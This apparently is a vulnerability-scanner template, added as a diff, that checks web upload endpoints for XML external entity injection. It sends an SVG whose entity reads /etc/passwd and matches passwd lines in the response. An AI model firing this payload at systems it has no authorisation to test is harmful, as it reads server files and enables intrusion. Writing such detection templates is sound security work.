@@ -1,0 +1,32 @@
+id: xxe-svg-upload
+info:
+  name: XXE via SVG File Upload
+  author: AniipID
+  severity: critical
+  description: Detects XXE through SVG image upload functionality, commonly found in profile picture uploads
+  tags: xxe,svg,upload,image
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/profile/upload"
+    headers:
+      Content-Type: image/svg+xml
+    body: |
+      <?xml version="1.0" standalone="yes"?>
+      <!DOCTYPE svg [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+        <text x="20" y="35">&xxe;</text>
+      </svg>
+    matchers:
+      - type: word
+        words:
+          - "root:x:0"
+          - "daemon:x:1"
+          - "bin:x:2"
+        condition: or
+        part: body
